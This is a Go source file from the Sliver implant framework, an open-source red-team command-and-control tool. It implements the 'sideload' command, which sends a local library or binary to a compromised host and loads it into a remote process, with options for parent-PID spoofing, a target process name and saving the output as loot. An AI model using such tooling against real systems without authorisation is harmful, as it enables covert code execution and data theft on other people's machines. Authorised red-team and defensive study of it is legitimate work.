package exec

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/spf13/cobra"
	"google.golang.org/protobuf/proto"
)

// SideloadCmd - Sideload a shared library on the remote system.
func SideloadCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	session, beacon := con.ActiveTarget.GetInteractive()
	if session == nil && beacon == nil {
		return
	}

	if len(args) < 1 {
		cmd.Usage()
		return
	}

	binPath := args[0]
	var binArgs []string
	if len(args) > 1 {
		binArgs = args[1:]
	}

	entryPoint, _ := cmd.Flags().GetString("entry-point")
	processName, _ := cmd.Flags().GetString("process")
	keepAlive, _ := cmd.Flags().GetBool("keep-alive")
	isUnicode, _ := cmd.Flags().GetBool("unicode")
	pPid, _ := cmd.Flags().GetUint32("ppid")

	binData, err := os.ReadFile(binPath)
	if err != nil {
		con.PrintErrorf("%s", err.Error())
		return
	}
	processArgsStr, _ := cmd.Flags().GetString("process-arguments")
	processArgs := strings.Split(processArgsStr, " ")
	isDLL := (filepath.Ext(binPath) == ".dll")
	ctrl := make(chan bool)
	con.SpinUntil(fmt.Sprintf("Sideloading %s %v...", binPath, binArgs), ctrl)
	sideload, err := con.Rpc.Sideload(context.Background(), &sliverpb.SideloadReq{
		Request:     con.ActiveTarget.Request(cmd),
		Args:        binArgs,
		Data:        binData,
		EntryPoint:  entryPoint,
		ProcessName: processName,
		Kill:        !keepAlive,
		IsDLL:       isDLL,
		IsUnicode:   isUnicode,
		PPid:        pPid,
		ProcessArgs: processArgs,
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("Error: %v", err)
		return
	}

	hostName := getHostname(session, beacon)
	if sideload.Response != nil && sideload.Response.Async {
		con.AddBeaconCallback(sideload.Response.TaskID, func(task *clientpb.BeaconTask) {
			err = proto.Unmarshal(task.Response, sideload)
			if err != nil {
				con.PrintErrorf("Failed to decode response %s\n", err)
				return
			}

			HandleSideloadResponse(sideload, binPath, hostName, cmd, con)
		})
		con.PrintAsyncResponse(sideload.Response)
	} else {
		HandleSideloadResponse(sideload, binPath, hostName, cmd, con)
	}
}

func HandleSideloadResponse(sideload *sliverpb.Sideload, binPath string, hostName string, cmd *cobra.Command, con *console.SliverClient) {
	saveLoot, _ := cmd.Flags().GetBool("loot")
	lootName, _ := cmd.Flags().GetString("name")

	if sideload.GetResponse().GetErr() != "" {
		con.PrintErrorf("%s\n", sideload.GetResponse().GetErr())
		return
	}

	save, _ := cmd.Flags().GetBool("save")

	PrintExecutionOutput(sideload.GetResult(), save, cmd.Name(), hostName, con)

	if saveLoot {
		LootExecute([]byte(sideload.Result), lootName, cmd.Name(), binPath, hostName, con)
	}
}
